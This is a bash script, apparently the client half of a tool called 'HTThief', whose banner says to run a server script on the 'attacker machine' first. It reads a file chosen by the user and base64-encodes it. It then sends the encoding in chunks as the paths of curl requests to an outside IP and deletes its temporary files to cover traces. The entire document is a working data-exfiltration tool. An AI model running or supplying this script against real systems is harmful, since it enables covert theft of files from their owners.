#!/bin/bash
#
#
cat << "EOF"


 █████   █████ ███████████ ███████████ █████       ███              ██████ 
░░███   ░░███ ░█░░░███░░░█░█░░░███░░░█░░███       ░░░              ███░░███
 ░███    ░███ ░   ░███  ░ ░   ░███  ░  ░███████   ████   ██████   ░███ ░░░ 
 ░███████████     ░███        ░███     ░███░░███ ░░███  ███░░███ ███████   
 ░███░░░░░███     ░███        ░███     ░███ ░███  ░███ ░███████ ░░░███░    
 ░███    ░███     ░███        ░███     ░███ ░███  ░███ ░███░░░    ░███     
 █████   █████    █████       █████    ████ █████ █████░░██████   █████    
░░░░░   ░░░░░    ░░░░░       ░░░░░    ░░░░ ░░░░░ ░░░░░  ░░░░░░   ░░░░░     
                                                                           

########################################################################################################
That's the client script. Don't forget to run the server script on you attacker machine before run this.                                                                           
########################################################################################################



EOF

# Check if the --ip parameter is provided
if [ "$1" != "--ip" ]; then
    echo "Usage: $0 --ip <HTThief_Server_IP>"
    exit 1
fi

# Cleaning residual files
rm -f /tmp/ax0*

# Get the URL parameter value
url_parameter="$2"

# Path to file to be sent
echo "Path to file to be sent:"
read path

echo " "

# Encode the file
echo "Encoding the file..."
ENCODED=$(base64 "$path")
echo "$ENCODED" > /tmp/ax0c.txt

echo " "

# Organize the file
echo "Organizing the file..."
tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
FILE="/tmp/ax0d.txt"

echo " "
echo "Doing the magic ;)"

# Prepare the file to be sent
for i in $(cat "$FILE"); do
    echo "http://$url_parameter/$i" >> /tmp/ax0a.txt
done

echo "Send the file..."
echo " "

# Process the URLs
FILE2="/tmp/ax0a.txt"
echo "$FILE2"

while read -r j; do
    curl -j "$j" 2>/dev/null
done < "$FILE2"

echo " "
# Cleaning residual files - just in case
rm -f /tmp/ax0*

echo "Done!"
